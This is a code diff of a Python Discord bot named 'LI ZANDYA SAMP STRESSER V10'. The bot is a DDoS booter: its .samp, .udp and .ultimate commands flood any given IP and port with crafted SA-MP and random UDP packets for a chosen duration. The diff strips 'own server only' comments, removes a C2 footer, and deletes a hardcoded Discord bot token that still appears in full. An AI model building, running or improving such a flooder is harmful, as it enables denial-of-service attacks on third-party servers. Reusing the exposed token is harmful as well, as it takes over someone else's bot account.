@@ -12,14 +12,17 @@ import socket
 import struct
 import time
 import os
-import threading
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
 
 # ============================================
-# التوكن - ضع التوكن الجديد هنا
+# التوكن - سيتم طلبه عند تشغيل الكود
 # ============================================
-TOKEN = "MTQ5NzI0NjQxMDY0OTg5NTA1Mg.GbTNbr.TK9ernnRI8EJ5Ij45CsRgWeMyKOSCvjYeKG2Zo"
+TOKEN = input("🔑 Enter your Discord Bot Token: ").strip()
+
+if not TOKEN:
+    print("❌ No token provided! Exiting...")
+    exit(1)
 
 # ============================================
 # إعدادات القوة القصوى
@@ -32,8 +35,8 @@ BUFFER_SIZE = 1024 * 1024 * 10
 # ============================================
 # تخزين بيانات المستخدمين
 # ============================================
-active_users = {}  # {user_id: {"start_time": time, "status": "active"}}
-total_users = set()  # جميع المستخدمين الذين استخدموا البوت
+active_users = {}
+total_users = set()
 
 print(f"""
 ╔══════════════════════════════════════════════════════════════╗
@@ -64,7 +67,6 @@ class SAMPStresser:
         sent = 0
         bytes_sent = 0
         
-        # تسجيل المستخدم
         if user_id:
             active_users[user_id] = {"start_time": time.time(), "status": "active", "target": f"{ip}:{port}"}
             total_users.add(user_id)
@@ -80,7 +82,6 @@ class SAMPStresser:
                 
                 while self.running and time.time() - start < duration:
                     for _ in range(10):
-                        # حزمة SAMP متطورة
                         packet = b'SAMP'
                         packet += struct.pack('<I', random.randint(1, 999999))
                         packet += b'\x80'
@@ -95,7 +96,6 @@ class SAMPStresser:
                         sent += 1
                         bytes_sent += len(packet)
                         
-                        # حزمة UDP عادية
                         udp_packet = os.urandom(random.randint(1024, 4096))
                         sock.sendto(udp_packet, (ip, port))
                         sent += 1
@@ -213,7 +213,7 @@ class SAMPStresser:
 stresser = SAMPStresser()
 
 # ============================================
-# البوت - أوامر بسيطة مع إحصائيات المستخدمين
+# البوت
 # ============================================
 intents = discord.Intents.default()
 intents.message_content = True
@@ -237,22 +237,19 @@ async def on_ready():
 ║   .stats                   - Show statistics               ║
 ║   .active                  - Show active attacks           ║
 ║   .profile                 - Show user profile             ║
+║   .users                   - Show bot users                ║
 ║   .stop                    - Stop all attacks              ║
 ╚══════════════════════════════════════════════════════════════╝
     """)
 
 @bot.command()
 async def samp(ctx, ip: str, port: int, duration: int):
-    """هجوم SAMP - استخدم على سيرفرك فقط"""
     await ctx.send(f"💀 **SAMP ATTACK STARTED**\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s")
-    start = time.time()
     packets, bytes_sent, rate, mbps = await stresser.attack_samp(ip, port, duration, ctx.author.id)
-    elapsed = time.time() - start
     await ctx.send(f"✅ **SAMP ATTACK COMPLETE!**\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps\n📊 Bandwidth: {mbps:.2f} Mbps")
 
 @bot.command()
 async def udp(ctx, ip: str, port: int, duration: int):
-    """هجوم UDP - استخدم على سيرفرك فقط"""
     await ctx.send(f"💀 **UDP ATTACK STARTED**\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s")
     packets, bytes_sent, rate = await stresser.attack_udp(ip, port, duration, ctx.author.id)
     mbps = (bytes_sent / duration) / 1024 / 1024
@@ -260,14 +257,12 @@ async def udp(ctx, ip: str, port: int, duration: int):
 
 @bot.command()
 async def ultimate(ctx, ip: str, port: int, duration: int):
-    """الهجوم النهائي - جميع الأنواع معاً"""
     await ctx.send(f"💀 **ULTIMATE ATTACK STARTED**\n🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s")
     packets, rate = await stresser.attack_ultimate(ip, port, duration, ctx.author.id)
     await ctx.send(f"✅ **ULTIMATE ATTACK COMPLETE!**\n📦 Total Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps")
 
 @bot.command()
 async def stats(ctx):
-    """إحصائيات البوت"""
     active = len(active_users)
     embed = discord.Embed(title="📊 STRESSER STATISTICS", color=0xFFD700)
     embed.add_field(name="📦 Total Packets", value=f"{stresser.stats['total_packets']:,}", inline=True)
@@ -276,12 +271,10 @@ async def stats(ctx):
     embed.add_field(name="🏆 Peak Speed", value=f"{stresser.stats['peak_speed']:,.0f} pps", inline=True)
     embed.add_field(name="👥 Total Users", value=f"{len(total_users)}", inline=True)
     embed.add_field(name="🔧 Threads", value=f"{MAX_THREADS}", inline=True)
-    embed.add_field(name="💻 CPU", value=f"{CPU_CORES} Cores", inline=True)
     await ctx.send(embed=embed)
 
 @bot.command()
 async def active(ctx):
-    """عرض الهجمات النشطة"""
     if not active_users:
         await ctx.send("🟢 No active attacks.")
         return
@@ -298,23 +291,15 @@ async def active(ctx):
 
 @bot.command()
 async def profile(ctx):
-    """عرض بروفايل المستخدم"""
     user_id = ctx.author.id
     user = ctx.author
-    
-    # حساب عدد الهجمات التي قام بها المستخدم
-    user_attacks = 0  # يمكن تطويره لحفظ عدد هجمات كل مستخدم
-    
     is_active = user_id in active_users
     
     embed = discord.Embed(title=f"👤 {user.name}'s PROFILE", color=0x00FF00)
     embed.set_thumbnail(url=user.avatar.url if user.avatar else None)
     embed.add_field(name="🆔 ID", value=f"`{user_id}`", inline=True)
-    embed.add_field(name="📅 Joined", value=f"<t:{int(user.created_at.timestamp())}:R>", inline=True)
     embed.add_field(name="⚡ Active Now", value="✅ Yes" if is_active else "❌ No", inline=True)
-    embed.add_field(name="💀 Total Attacks", value=f"{user_attacks}", inline=True)
     embed.add_field(name="👥 Total Bot Users", value=f"{len(total_users)}", inline=True)
-    embed.add_field(name="🔥 Active Users", value=f"{len(active_users)}", inline=True)
     
     if is_active:
         target = active_users[user_id]['target']
@@ -325,22 +310,19 @@ async def profile(ctx):
     await ctx.send(embed=embed)
 
 @bot.command()
-async def stop(ctx):
-    """إيقاف جميع الهجمات"""
-    stresser.running = False
-    active_users.clear()
-    await ctx.send("⏹️ **ALL ATTACKS STOPPED!**")
-
-@bot.command()
 async def users(ctx):
-    """عرض عدد المستخدمين الذين يشغلون البوت"""
     embed = discord.Embed(title="👥 BOT USER STATISTICS", color=0x00BFFF)
     embed.add_field(name="📊 Total Users", value=f"`{len(total_users)}`", inline=True)
     embed.add_field(name="⚡ Active Users", value=f"`{len(active_users)}`", inline=True)
     embed.add_field(name="💤 Inactive Users", value=f"`{len(total_users) - len(active_users)}`", inline=True)
-    embed.set_footer(text="LI ZANDYA C2 SYSTEM V10")
     await ctx.send(embed=embed)
 
+@bot.command()
+async def stop(ctx):
+    stresser.running = False
+    active_users.clear()
+    await ctx.send("⏹️ **ALL ATTACKS STOPPED!**")
+
 if __name__ == "__main__":
-    print("Starting LI ZANDYA SAMP STRESSER V10...")
+    print("🚀 Starting LI ZANDYA SAMP STRESSER V10...")
     bot.run(TOKEN)
